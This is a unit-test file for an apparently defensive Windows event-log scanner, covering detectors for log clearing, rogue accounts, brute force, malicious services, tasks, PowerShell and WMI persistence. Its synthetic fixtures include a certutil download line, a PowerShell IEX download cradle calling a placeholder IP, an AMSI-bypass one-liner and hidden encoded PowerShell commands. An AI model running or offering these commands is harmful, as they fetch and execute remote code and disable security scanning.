"""Unit tests for aegis.scanners.eventlog: event parsing and every detector run on synthetic event dicts / XML
(the PowerShell collection layer is mocked, so these run on any OS)."""

import json

import pytest

from aegis.core import fileanalysis as fa
from aegis.core.models import CheckResult, CheckStatus, Finding, Severity
from aegis.scanners import eventlog as el

T0 = el.parse_time("2026-10-14T10:00:00Z")
B64 = "A" * 60  # stand-in for a long base64 blob


def E(event_id, log="Security", t=0, **data):
    return el.make_event(event_id, log, T0 + t, **data)


def ids(findings):
    return [f.rule_id for f in findings]


def one(findings, rule):
    got = [f for f in findings if f.rule_id == rule]
    assert got, f"{rule} not in {ids(findings)}"
    return got[0]


class FakeSigs:
    def __init__(self, bad_ips=(), hashes=None):
        self.bad_ips = set(bad_ips)
        self.hashes = hashes or {}

    def is_bad_ip(self, ip):
        return ip in self.bad_ips

    def lookup_hash(self, *hs):
        for h in hs:
            if h and h.lower() in self.hashes:
                return self.hashes[h.lower()]
        return None


# ---------------------------------------------------------------- time + XML parsing
def test_parse_time_variants():
    assert el.parse_time("2026-10-14T10:00:00Z") == T0
    assert el.parse_time("2026-10-14T10:00:00.1234567Z") == pytest.approx(T0 + 0.1234567)
    assert el.parse_time("2026-10-14 10:00:00") == T0
    assert el.parse_time("garbage") is None and el.parse_time(None) is None
    assert el.parse_time(12.5) == 12.5
    assert el.fmt_time(T0) == "2026-10-14 10:00:00 UTC"


XML_4720 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
    '<Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>'
    '<EventID>4720</EventID><Level>0</Level><TimeCreated SystemTime="2026-10-14T10:22:11.1234567Z"/>'
    '<Channel>Security</Channel><Computer>DESKTOP-ABC</Computer><Security/></System><EventData>'
    '<Data Name="TargetUserName">backdoor$</Data><Data Name="TargetDomainName">DESKTOP-ABC</Data>'
    '<Data Name="TargetSid">S-1-5-21-1-2-3-1002</Data><Data Name="SubjectUserSid">S-1-5-21-1-2-3-1001</Data>'
    '<Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">DESKTOP-ABC</Data>'
    '<Data Name="PrivilegeList">-</Data></EventData></Event>')

XML_1102 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
    '<Provider Name="Microsoft-Windows-Eventlog"/><EventID Qualifiers="16384">1102</EventID>'
    '<TimeCreated SystemTime="2026-10-14T11:00:00.000000000Z"/><Channel>Security</Channel>'
    '<Computer>DESKTOP-ABC</Computer></System><UserData>'
    '<LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">'
    '<SubjectUserSid>S-1-5-21-1-2-3-1001</SubjectUserSid><SubjectUserName>bob</SubjectUserName>'
    '<SubjectDomainName>DESKTOP-ABC</SubjectDomainName><SubjectLogonId>0x3e7</SubjectLogonId>'
    '</LogFileCleared></UserData></Event>')


def test_parse_event_data_xml():
    e = el.parse_event_xml(XML_4720)
    assert e["id"] == 4720 and e["computer"] == "DESKTOP-ABC" and e["provider"].endswith("Security-Auditing")
    assert e["ts"] == pytest.approx(el.parse_time("2026-10-14T10:22:11Z") + 0.1234567)
    assert e["data"]["TargetUserName"] == "backdoor$" and e["data"]["SubjectUserName"] == "bob"
    assert e["data"]["TargetSid"].endswith("-1002")


def test_parse_user_data_xml():
    e = el.parse_event_xml(XML_1102)
    assert e["id"] == 1102
    assert e["data"]["SubjectUserName"] == "bob" and e["data"]["SubjectLogonId"] == "0x3e7"


def test_parse_bad_xml_returns_none():
    assert el.parse_event_xml("<Event><System>") is None
    assert el.parse_event_xml("") is None


def test_normalize_record_xml_and_sbl():
    e = el.normalize_record({"I": 4720, "X": XML_4720}, "Security")
    assert e["log"] == "Security" and e["id"] == 4720
    s = el.normalize_record({"I": 4104, "L": 3, "T": "2026-10-14T10:00:00.5Z",
                             "D": {"ScriptBlockText": "x", "ScriptBlockId": "{1}", "MessageNumber": "1"}}, "PowerShell")
    assert s["id"] == 4104 and s["level"] == 3 and s["data"]["ScriptBlockId"] == "{1}" and s["ts"] > T0
    assert el.normalize_record("nope", "Security") is None
    assert el.normalize_record({"I": 1, "X": "<bad"}, "Security") is None


# ---------------------------------------------------------------- PowerShell query construction
@pytest.mark.parametrize("spec", el.LOG_SPECS, ids=lambda s: s.key)
def test_query_script_is_one_batched_locale_free_call(spec):
    script = el.build_query_script(spec)
    assert script.count("ConvertTo-Json") == 1  # single JSON document per log
    assert "-FilterHashtable" in script and "StartTime=$start" in script and "AddDays(-14)" in script
    assert script.count("-FilterHashtable") == len(spec.groups)
    assert "'" + spec.name + "'" in script and '"' not in script  # safe quoting on a Windows command line
    assert ".Message" not in script  # never the localised message text
    for g in spec.groups:
        assert f"Id=@({','.join(map(str, g.ids))})" in script
    # none of our own query scripts may look malicious to the script-block analysis (4104 logs them)
    assert [i.rule_id for i in fa.content_indicators(script.encode(), "script") if i.score > 0] == []


def test_query_script_logon_prefilter_and_caps():
    sec = el.build_query_script(el.LOG_SPECS[0], days=7)
    assert "AddDays(-7)" in sec
    assert "Data=@('3','10')" in sec and "Properties[8]" in sec and "Select-Object -First 1500" in sec
    assert "-MaxEvents 4000" in sec and "-MaxEvents 3000" in sec
    ps = el.build_query_script(el.LOG_SPECS[3])
    assert "ScriptBlockText" in ps and "Substring(0,20000)" in ps
    assert "SecurityCenter2" in el.build_query_script(el.LOG_SPECS[2])  # Defender spec asks about other AVs
    assert "O'Brien" not in el._ps_quote("x") and el._ps_quote("a'b") == "'a''b'"


# ---------------------------------------------------------------- 1102 / 104
def test_log_cleared_security_and_system():
    evs = [E(1102, "Security", 0, SubjectUserName="bob", SubjectDomainName="PC", SubjectUserSid="S-1-5-21-1"),
           E(104, "System", 60, SubjectUserName="bob", SubjectDomainName="PC", Channel="Application"),
           E(104, "System", 90, SubjectUserName="bob", SubjectDomainName="PC", Channel="System"),
           E(1102, "System", 5)]  # wrong log for 1102: ignored
    f = el.detect_log_cleared(evs)
    assert len(f) == 3 and all(x.rule_id == "AEG-EVT-CLEARED" for x in f)
    by_title = {x.title: x for x in f}
    assert by_title["The Security event log was cleared"].severity == Severity.HIGH
    assert by_title["The System event log was cleared"].severity == Severity.HIGH
    assert by_title["The Application event log was cleared"].severity == Severity.MEDIUM
    assert "T1685.005" in f[0].mitre and f[0].evidence["cleared_by"] == "PC\\bob"
    json.dumps([x.to_dict() for x in f])


# ---------------------------------------------------------------- accounts
def test_new_user_plain_and_hidden():
    f = el.detect_account_changes([
        E(4720, t=0, TargetUserName="alice", TargetSid="S-1-5-21-9-1001", SubjectUserName="bob", SubjectDomainName="PC"),
        E(4720, t=10, TargetUserName="svc$", TargetSid="S-1-5-21-9-1002", SubjectUserName="bob", SubjectDomainName="PC"),
        E(4720, t=20, TargetUserName="defaultuser1", TargetSid="S-1-5-21-9-1003", SubjectUserName="SYSTEM"),
        E(4720, t=30, TargetUserName="WDAGUtilityAccount", TargetSid="S-1-5-21-9-504", SubjectUserName="SYSTEM"),
        E(4720, t=40, TargetUserName="tmpuser", TargetSid="S-1-5-21-9-1004", SubjectUserName="SYSTEM",
          SubjectUserSid="S-1-5-18")])
    sev = {x.evidence["account"]: x.severity for x in f}
    assert sev == {"alice": Severity.MEDIUM, "svc$": Severity.HIGH, "tmpuser": Severity.LOW}
    assert all(x.rule_id == "AEG-EVT-NEWUSER" and "T1136.001" in x.mitre for x in f)


def test_new_admin_correlated_is_high_and_merged():
    sid = "S-1-5-21-9-1005"
    f = el.detect_account_changes([
        E(4720, t=0, TargetUserName="support", TargetSid=sid, SubjectUserName="bob", SubjectDomainName="PC"),
        E(4732, t=90, TargetSid="S-1-5-32-544", TargetUserName="Administrators", MemberSid=sid, MemberName="-",
          SubjectUserName="bob", SubjectDomainName="PC")])
    assert ids(f) == ["AEG-EVT-NEWADMIN"]  # one merged finding, not two
    assert f[0].severity == Severity.HIGH and f[0].category == "persistence"
    assert f[0].evidence["account"] == "support" and "T1098" in f[0].mitre


def test_admin_group_add_rules():
    f = el.detect_account_changes([
        # domain join: SYSTEM adds Domain Admins to local Administrators -> expected
        E(4732, t=0, TargetSid="S-1-5-32-544", MemberSid="S-1-5-21-1-2-3-512", SubjectUserName="SYSTEM",
          SubjectUserSid="S-1-5-18"),
        E(4732, t=10, TargetSid="S-1-5-32-544", MemberSid="S-1-5-21-9-1006", MemberName="CN=carol", SubjectUserName="bob",
          SubjectDomainName="PC"),
        E(4732, t=20, TargetSid="S-1-5-32-555", MemberSid="S-1-5-21-9-1007", SubjectUserName="bob", SubjectDomainName="PC"),
        E(4732, t=30, TargetSid="S-1-5-32-545", MemberSid="S-1-5-21-9-1008", SubjectUserName="bob")])  # Users: ignored
    assert len(f) == 2
    by_group = {x.evidence["group"]: x for x in f}
    assert by_group["Administrators"].severity == Severity.MEDIUM
    assert by_group["Remote Desktop Users"].severity == Severity.MEDIUM and "T1021.001" in by_group["Remote Desktop Users"].mitre


def test_builtin_account_enabled_and_normal_enable_ignored():
    f = el.detect_account_changes([
        E(4722, t=0, TargetUserName="Administrator", TargetSid="S-1-5-21-9-500", SubjectUserName="bob"),
        E(4722, t=5, TargetUserName="Guest", TargetSid="S-1-5-21-9-501", SubjectUserName="bob"),
        # created then enabled right away: normal flow
        E(4720, t=100, TargetUserName="dave", TargetSid="S-1-5-21-9-1010", SubjectUserName="SYSTEM", SubjectUserSid="S-1-5-18"),
        E(4722, t=101, TargetUserName="dave", TargetSid="S-1-5-21-9-1010", SubjectUserName="SYSTEM"),
        # re-enabling an old, ordinary account
        E(4722, t=200, TargetUserName="olduser", TargetSid="S-1-5-21-9-1011", SubjectUserName="bob")])
    rules = sorted(ids(f))
    assert rules.count("AEG-EVT-BUILTIN-ENABLED") == 2 and rules.count("AEG-EVT-USER-ENABLED") == 1
    assert one(f, "AEG-EVT-BUILTIN-ENABLED").severity == Severity.MEDIUM
    assert one(f, "AEG-EVT-USER-ENABLED").evidence["account"] == "olduser"


# ---------------------------------------------------------------- password guessing
def fails(n, ip="45.155.205.10", start=0, step=5, user="administrator", ltype=10):
    return [E(4625, t=start + i * step, IpAddress=ip, TargetUserName=user, LogonType=ltype, Status="0xc000006d",
              WorkstationName="-") for i in range(n)]


def logon(t, ip="45.155.205.10", user="administrator", ltype=10):
    return E(4624, t=t, IpAddress=ip, TargetUserName=user, LogonType=ltype, TargetUserSid="S-1-5-21-9-500")


def test_brute_force_then_success_is_high_with_block_fix():
    f = el.detect_logon_attacks(fails(25) + [logon(400)])
    assert ids(f) == ["AEG-EVT-BRUTE-SUCCESS"]
    x = f[0]
    assert x.severity == Severity.HIGH and x.category == "network"
    assert x.evidence["failed_attempts"] == 25 and x.evidence["successful_account"] == "administrator"
    assert x.evidence["source_kind"] == "external" and "T1110.001" in x.mitre and "T1021.001" in x.mitre
    assert x.remediation and x.remediation.action == "run_command"
    cmd = x.remediation.params["command"]
    assert cmd[:4] == ["netsh", "advfirewall", "firewall", "add"] and "remoteip=45.155.205.10" in cmd
    assert "45.155.205.10" in x.title and x.location.endswith("45.155.205.10 after password guessing")


def test_brute_force_without_success_and_stable_fingerprint():
    a = el.detect_logon_attacks(fails(30))[0]
    b = el.detect_logon_attacks(fails(31))[0]  # a few more attempts next scan -> same fingerprint
    assert a.rule_id == "AEG-EVT-BRUTE" and a.severity == Severity.MEDIUM
    assert a.fingerprint == b.fingerprint


def test_brute_force_internal_source_is_low():
    f = el.detect_logon_attacks(fails(15, ip="192.168.1.50", ltype=3))
    assert f[0].rule_id == "AEG-EVT-BRUTE" and f[0].severity == Severity.LOW and f[0].remediation is None
    ok = el.detect_logon_attacks(fails(15, ip="192.168.1.50", ltype=3) + [logon(300, ip="192.168.1.50", ltype=3)])
    assert ok[0].rule_id == "AEG-EVT-BRUTE-SUCCESS" and ok[0].severity == Severity.MEDIUM


def test_slow_failures_are_not_a_burst():
    slow = fails(30, step=3600)  # one failure per hour
    assert el.detect_logon_attacks(slow) == []
    assert el.detect_logon_attacks(fails(5)) == []  # below threshold
    assert el.find_bursts([0, 1, 2], 10, 60) is None
    assert el.find_bursts(list(range(10)), 10, 60) == (10, 0, 9)


def test_success_from_other_source_or_before_burst_does_not_correlate():
    evs = fails(20) + [logon(10, ip="91.240.118.9", user="bob")]  # a different external IP logs in
    f = el.detect_logon_attacks(evs)
    assert "AEG-EVT-BRUTE" in ids(f) and "AEG-EVT-BRUTE-SUCCESS" not in ids(f)
    assert one(f, "AEG-EVT-EXTERNAL-LOGON").evidence["source"] == "91.240.118.9"
    before = [logon(-5000)] + fails(20)  # success long before the burst
    f2 = el.detect_logon_attacks(before)
    assert "AEG-EVT-BRUTE-SUCCESS" not in ids(f2)


def test_external_logon_no_burst_and_ignored_logons():
    f = el.detect_logon_attacks([logon(0), logon(5),  # same IP twice -> one finding
                                 logon(10, ip="10.0.0.5"),  # internal
                                 logon(20, ip="91.240.118.20", user="WIN10$", ltype=3),  # machine account
                                 logon(30, ip="91.240.118.21", user="ANONYMOUS LOGON", ltype=3),
                                 E(4624, t=40, IpAddress="91.240.118.22", TargetUserName="bob", LogonType=2)])
    assert ids(f) == ["AEG-EVT-EXTERNAL-LOGON"]
    assert f[0].severity == Severity.MEDIUM and "Remote Desktop" in f[0].title


def test_password_spraying_and_known_bad_ip():
    evs = []
    for i in range(30):
        evs.append(E(4625, t=i * 3, IpAddress="45.155.205.99", TargetUserName=f"user{i % 7}", LogonType=3, WorkstationName="-"))
    f = el.detect_logon_attacks(evs + [logon(200, ip="45.155.205.99", user="user3", ltype=3)], FakeSigs(bad_ips=["45.155.205.99"]))
    assert f[0].rule_id == "AEG-EVT-BRUTE-SUCCESS" and f[0].severity == Severity.CRITICAL
    assert f[0].evidence["password_spraying"] is True and "T1110.003" in f[0].mitre and f[0].evidence["known_bad_ip"]


def test_failures_without_ip_group_by_workstation():
    evs = [E(4625, t=i, IpAddress="-", WorkstationName="ATTACKER-PC", TargetUserName="x", LogonType=3) for i in range(12)]
    f = el.detect_logon_attacks(evs)
    assert f and "ws:ATTACKER-PC" in f[0].evidence["source"] and f[0].severity == Severity.LOW


@pytest.mark.parametrize("ip,kind", [("45.155.205.10", "external"), ("8.8.8.8", "external"), ("10.1.2.3", "internal"),
                                     ("192.168.0.1", "internal"), ("169.254.1.1", "internal"), ("127.0.0.1", "local"),
                                     ("::1", "local"), ("::ffff:8.8.8.8", "external"), ("fe80::1%12", "internal"),
                                     ("-", "unknown"), ("", "unknown"), ("not-an-ip", "unknown")])
def test_classify_ip(ip, kind):
    assert el.classify_ip(ip) == kind


# ---------------------------------------------------------------- services
def test_service_from_user_writable_path_is_flagged_with_disable_fix():
    f = el.detect_service_installs([
        E(7045, "System", 0, ServiceName="UpdaterSvc", ImagePath=r"C:\Users\bob\AppData\Local\Temp\upd.exe",
          AccountName="LocalSystem")])
    x = f[0]
    assert x.rule_id == "AEG-EVT-SVCINSTALL" and x.severity >= Severity.MEDIUM and x.category == "persistence"
    assert x.remediation.action == "disable_service" and x.remediation.params == {"name": "UpdaterSvc"}
    assert "T1543.003" in x.mitre and x.evidence["service"] == "UpdaterSvc"


def test_normal_services_are_ignored():
    f = el.detect_service_installs([
        E(7045, "System", 0, ServiceName="Spooler", ImagePath=r"C:\Windows\System32\spoolsv.exe"),
        E(7045, "System", 1, ServiceName="netsvc", ImagePath=r"C:\Windows\system32\svchost.exe -k netsvcs -p"),
        E(7045, "System", 2, ServiceName="Foo", ImagePath=r'"C:\Program Files\Foo\foo.exe" --service'),
        E(4697, "Security", 3, ServiceName="Bar", ServiceFileName=r"C:\Program Files (x86)\Bar\bar.exe"),
        E(7045, "System", 4, ServiceName="drv", ImagePath=r"\SystemRoot\System32\drivers\foo.sys")])
    assert f == []


def test_service_remote_exec_driver_and_psexec_patterns():
    f = el.detect_service_installs([
        E(7045, "System", 0, ServiceName="BTOBTO",
          ImagePath=r"%COMSPEC% /Q /c echo cd > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat"),
        E(7045, "System", 1, ServiceName="PSEXESVC", ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
        E(7045, "System", 2, ServiceName="gdrv", ImagePath=r"C:\Users\Public\gdrv.sys"),
        E(7045, "System", 3, ServiceName="RTCore64", ImagePath=r"\??\C:\Windows\System32\drivers\RTCore64.sys")])
    by = {x.evidence["service"]: x for x in f}
    assert by["BTOBTO"].severity == Severity.HIGH and "T1021.002" in by["BTOBTO"].mitre
    assert by["PSEXESVC"].severity == Severity.MEDIUM
    assert by["gdrv"].severity == Severity.HIGH and by["gdrv"].title.startswith("Suspicious new driver")
    assert by["RTCore64"].severity == Severity.MEDIUM  # known abusable driver, standard location


def test_service_4697_and_7045_deduplicated():
    img = r"C:\ProgramData\x\run.exe"
    f = el.detect_service_installs([E(4697, "Security", 0, ServiceName="X", ServiceFileName=img, SubjectUserName="bob"),
                                    E(7045, "System", 1, ServiceName="X", ImagePath=img)])
    assert len(f) == 1


def test_service_powershell_encoded_is_high():
    f = el.detect_service_installs([E(7045, "System", 0, ServiceName="upd", ImagePath=
                                      f"powershell.exe -nop -w hidden -enc {B64}")])
    assert f[0].severity == Severity.HIGH


# ---------------------------------------------------------------- scheduled tasks
def task_xml(command, arguments="", user="S-1-5-18", level="HighestAvailable", trigger="LogonTrigger"):
    return ('<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" '
            'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><' + trigger + '><UserId>decoy</UserId></' + trigger + '>'
            '</Triggers><Principals><Principal id="Author"><UserId>' + user + '</UserId><RunLevel>' + level +
            '</RunLevel></Principal></Principals><Settings><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec>'
            '<Command>' + command + '</Command><Arguments>' + arguments + '</Arguments></Exec></Actions></Task>')


def test_parse_task_xml():
    info = el.parse_task_xml(task_xml("cmd.exe", "/c calc"))
    assert info["actions"] == [{"command": "cmd.exe", "arguments": "/c calc", "workdir": ""}]
    assert info["user"] == "S-1-5-18" and info["run_level"] == "HighestAvailable" and info["hidden"] is True
    assert info["triggers"] == ["LogonTrigger"]
    assert el.parse_task_xml("") == el.parse_task_xml("<not xml")
    assert el.parse_task_xml('<!DOCTYPE x [<!ENTITY a "b">]><Task/>')["actions"] == []  # DTDs refused


def test_task_creation_encoded_powershell_and_user_writable():
    f = el.detect_task_creations([
        E(4698, t=0, TaskName=r"\Updater", SubjectUserName="bob", SubjectDomainName="PC",
          TaskContent=task_xml("powershell.exe", f"-NoP -W Hidden -ExecutionPolicy Bypass -enc {B64}")),
        E(4698, t=10, TaskName=r"\Backup", SubjectUserName="bob",
          TaskContent=task_xml(r"C:\Users\bob\AppData\Local\Temp\bk.exe", user="bob", level="LeastPrivilege")),
        E(4698, t=20, TaskName=r"\Microsoft\Windows\Defrag\ScheduledDefrag", SubjectUserName="SYSTEM",
          TaskContent=task_xml(r"%windir%\system32\defrag.exe", "-c -h -o -$")),
        E(4698, t=30, TaskName=r"\OneDrive Standalone Update Task", SubjectUserName="bob",
          TaskContent=task_xml(r"C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe", user="bob"))])
    by = {x.evidence["task"]: x for x in f}
    assert set(by) == {r"\Updater", r"\Backup"}
    assert by[r"\Updater"].severity == Severity.HIGH and by[r"\Updater"].remediation.action == "disable_task"
    assert by[r"\Updater"].remediation.params == {"name": r"\Updater"}
    assert by[r"\Backup"].severity == Severity.MEDIUM and "T1053.005" in by[r"\Backup"].mitre
    assert by[r"\Updater"].evidence["run_level"] == "HighestAvailable" and by[r"\Updater"].evidence["hidden"]


# ---------------------------------------------------------------- process creation
def test_process_creation_lolbin_and_office_chain():
    f = el.detect_process_creation([
        E(4688, t=0, NewProcessName=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
          ParentProcessName=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", SubjectUserName="bob",
          CommandLine=f"powershell.exe -nop -w hidden -enc {B64}"),
        E(4688, t=5, NewProcessName=r"C:\Windows\System32\cmd.exe", ParentProcessName=r"C:\Windows\explorer.exe",
          SubjectUserName="bob", CommandLine="cmd.exe /c dir"),
        E(4688, t=6, NewProcessName=r"C:\Windows\System32\notepad.exe", ParentProcessName=r"C:\Windows\explorer.exe",
          CommandLine="notepad.exe notes.txt"),
        E(4688, t=7, NewProcessName=r"C:\Windows\System32\cmd.exe",
          ParentProcessName=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", CommandLine=""),
        E(4688, t=8, NewProcessName=r"C:\Windows\System32\certutil.exe", ParentProcessName=r"C:\Windows\explorer.exe",
          CommandLine="certutil -urlcache -f http://203.0.113.5/a.exe a.exe")])
    assert len(f) == 3 and all(x.rule_id == "AEG-EVT-PROC" for x in f)
    assert f[0].severity == Severity.HIGH
    office = [x for x in f if any(m.startswith("chain:") for m in x.evidence["matched"])]
    assert len(office) == 2 and any("T1204.002" in x.mitre for x in office)
    assert any("AEG-CMD-CERTUTIL-URL" in x.evidence["matched"] for x in f)


def test_sysmon_process_known_hash_is_critical():
    sha = "ab" * 32
    f = el.detect_process_creation([E(1, "Sysmon", 0, Image=r"C:\Users\bob\Downloads\x.exe", CommandLine="x.exe",
                                      Hashes=f"MD5={'0' * 32},SHA256={sha.upper()},IMPHASH=1", User="PC\\bob")],
                                   FakeSigs(hashes={sha: "Trojan.Test"}))
    assert f[0].rule_id == "AEG-EVT-PROC-KNOWN" and f[0].severity == Severity.CRITICAL and f[0].category == "malware"
    assert el.parse_hashes("MD5=AA,SHA256=BB")["SHA256"] == "bb"


# ---------------------------------------------------------------- Defender
def det(t, threat="Trojan:Win32/Wacatac.B!ml", path=r"file:_C:\Users\bob\Downloads\a.exe", did="{1}", sev_id="5", log_id=1116,
        **extra):
    return E(log_id, "Defender", t, **{"Threat Name": threat, "Path": path, "Detection ID": did, "Severity ID": sev_id,
                                       "Threat ID": "2147", "Detection User": "PC\\bob", **extra})


def test_defender_detection_states():
    unresolved = el.detect_defender_events([det(0)])
    assert unresolved[0].severity == Severity.HIGH and "no clean-up recorded" in unresolved[0].title
    assert unresolved[0].category == "malware" and unresolved[0].location == r"C:\Users\bob\Downloads\a.exe"

    removed = el.detect_defender_events([det(0), det(5, log_id=1117, **{"Action ID": "2"})])
    assert removed[0].severity == Severity.MEDIUM and "removed" in removed[0].title

    removed_low = el.detect_defender_events([det(0, sev_id="2"), det(5, sev_id="2", log_id=1117, **{"Action ID": "2"})])
    assert removed_low[0].severity == Severity.LOW

    failed = el.detect_defender_events([det(0), det(5, log_id=1118)])
    assert failed[0].severity == Severity.HIGH and "could not be removed" in failed[0].title

    allowed = el.detect_defender_events([det(0), det(5, log_id=1117, **{"Action ID": "6"})])
    assert allowed[0].severity == Severity.HIGH and "allowed" in allowed[0].title

    eicar = el.detect_defender_events([det(0, threat="Virus:DOS/EICAR_Test_File")])
    assert eicar[0].severity == Severity.INFO


def test_defender_protection_off_other_av_downgrades():
    evs = [E(5001, "Defender", 0), E(5010, "Defender", 5), E(5012, "Defender", 10)]
    alone = el.detect_defender_events(evs)
    assert len(alone) == 3 and all(x.severity == Severity.MEDIUM and "T1685" in x.mitre for x in alone)
    with_av = el.detect_defender_events(evs, av_products=["Avast Antivirus", "Windows Defender"])
    assert all(x.severity == Severity.LOW for x in with_av) and "Avast Antivirus" in with_av[0].description


def test_defender_exclusion_added():
    f = el.detect_defender_events([
        E(5007, "Defender", 0, **{"Old Value": "", "New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\bob\AppData\Roaming\x = 0x0"}),
        E(5007, "Defender", 5, **{"Old Value": "", "New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1"}),
        E(5007, "Defender", 9, **{"Old Value": "x", "New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Scan\ScheduleDay = 0x0"})])
    assert len(f) == 2 and all(x.severity == Severity.HIGH for x in f)
    assert {x.rule_id for x in f} == {"AEG-EVT-DEF-TAMPER"}
    assert any("exclusion" in x.title for x in f)


# ---------------------------------------------------------------- PowerShell 4104
def sb(t, text, bid="{aaa}", num=1, total=1, level=5):
    return el.make_event(4104, "PowerShell", T0 + t, level=level, ScriptBlockText=text, ScriptBlockId=bid,
                         MessageNumber=num, MessageTotal=total, Path="")


def test_script_block_reassembly_and_detection():
    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/p.ps1')"
    half = len(cradle) // 2
    parts = [sb(0, cradle[half:], num=2, total=2), sb(1, cradle[:half], num=1, total=2)]  # out of order
    blocks = el.reassemble_script_blocks(parts)
    assert len(blocks) == 1 and blocks[0]["text"] == cradle
    f = el.detect_powershell(parts + [sb(5, cradle, bid="{aaa}")])  # duplicate text is reported once
    assert len(f) == 1 and f[0].rule_id == "AEG-EVT-PSBLOCK" and f[0].severity >= Severity.MEDIUM
    assert any(i["id"].startswith("AEG-H-SCR") for i in f[0].evidence["indicators"]) and "T1059.001" in f[0].mitre
    assert f[0].evidence["script_block_id"] == "{aaa}"


def test_script_block_benign_and_amsi():
    benign = [sb(0, "Get-ChildItem -Path C:\\Users | Sort-Object Length | Select-Object -First 10", bid="{b1}"),
              sb(1, "function Get-Thing { param($x) return $x * 2 }; Get-Thing 4", bid="{b2}"),
              sb(2, "Write-Host hi", bid="{b3}")]
    assert el.detect_powershell(benign) == []
    amsi = el.detect_powershell([sb(0, "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                                    bid="{c1}", level=3)])
    assert amsi and amsi[0].severity == Severity.HIGH and amsi[0].evidence["powershell_flagged"] is True


# ---------------------------------------------------------------- WMI
def test_wmi_permanent_subscription():
    f = el.detect_wmi_subscriptions([
        E(5861, "WMI", 0, Namespace="//./root/subscription",
          ESS='"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
          CONSUMER='CommandLineEventConsumer.Name="Evil Consumer"', PossibleCause="Permanent"),
        E(5861, "WMI", 5, Namespace="//./root/subscription", ESS="x", CONSUMER='NTEventLogEventConsumer.Name="Other"',
          PossibleCause="Permanent"),
        E(5861, "WMI", 9, Namespace="//./root/subscription", ESS='__EventFilter.Name="SCM Event Log Filter"',
          CONSUMER='NTEventLogEventConsumer.Name="SCM Event Log Consumer"', PossibleCause="Permanent")])
    assert len(f) == 2
    cmd = next(x for x in f if "CommandLine" in x.title)
    assert cmd.severity == Severity.HIGH and "T1546.003" in cmd.mitre
    assert cmd.remediation.action == "remove_wmi_subscription" and cmd.remediation.params == {"name": "Evil Consumer"}
    other = next(x for x in f if x is not cmd)
    assert other.severity == Severity.MEDIUM and other.remediation is None


# ---------------------------------------------------------------- audit policy / Sysmon
def test_audit_policy_change():
    f = el.detect_audit_policy_changes([
        E(4719, t=0, SubjectUserName="SYSTEM", SubjectUserSid="S-1-5-18", SubcategoryGuid="{x}"),
        E(4719, t=5, SubjectUserName="bob", SubjectDomainName="PC", SubcategoryGuid="{0CCE922B}", AuditPolicyChanges="%%8448")])
    assert len(f) == 1 and f[0].rule_id == "AEG-EVT-AUDITPOL" and "T1685.001" in f[0].mitre


def test_sysmon_network_dll_and_drop():
    sysmon = [
        E(3, "Sysmon", 0, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="93.184.216.5",
          DestinationPort="443", Initiated="true"),
        E(3, "Sysmon", 1, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="10.0.0.2", Initiated="true"),  # internal
        E(3, "Sysmon", 2, Image=r"C:\Program Files\App\app.exe", DestinationIp="93.184.216.34", Initiated="true"),  # normal
        E(3, "Sysmon", 3, Image=r"C:\Users\bob\Downloads\tool.exe", DestinationIp="93.184.216.35", Initiated="true"),
        E(3, "Sysmon", 4, Image=r"C:\Program Files\App\app.exe", DestinationIp="45.9.148.77",
          Initiated="true"),
        E(7, "Sysmon", 10, Image=r"C:\Users\bob\AppData\Roaming\Foo\foo.exe",
          ImageLoaded=r"C:\Users\bob\AppData\Roaming\Foo\version.dll", Signed="false"),
        E(7, "Sysmon", 11, Image=r"C:\Windows\System32\svchost.exe", ImageLoaded=r"C:\Windows\System32\kernel32.dll", Signed="true"),
        E(11, "Sysmon", 20, Image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
          TargetFilename=r"C:\Users\bob\AppData\Local\Temp\dropper.exe"),
        E(11, "Sysmon", 21, Image=r"C:\Windows\explorer.exe",
          TargetFilename=r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk"),
        E(11, "Sysmon", 22, Image=r"C:\Windows\explorer.exe", TargetFilename=r"C:\Users\bob\Documents\notes.txt")]
    f = el.detect_sysmon(sysmon, FakeSigs(bad_ips=["45.9.148.77"]))
    by_rule = {}
    for x in f:
        by_rule.setdefault(x.rule_id, []).append(x)
    net = {x.evidence["destination"]: x for x in by_rule["AEG-EVT-SYSMON-NET"]}
    assert set(net) == {"93.184.216.5", "93.184.216.35", "45.9.148.77"}
    assert net["93.184.216.5"].severity == Severity.MEDIUM and net["93.184.216.35"].severity == Severity.LOW
    assert net["45.9.148.77"].severity == Severity.HIGH
    dll = by_rule["AEG-EVT-SYSMON-DLL"]
    assert len(dll) == 1 and "T1574.001" in dll[0].mitre
    drops = {x.evidence["target"]: x.severity for x in by_rule["AEG-EVT-SYSMON-DROP"]}
    assert drops[r"C:\Users\bob\AppData\Local\Temp\dropper.exe"] == Severity.HIGH
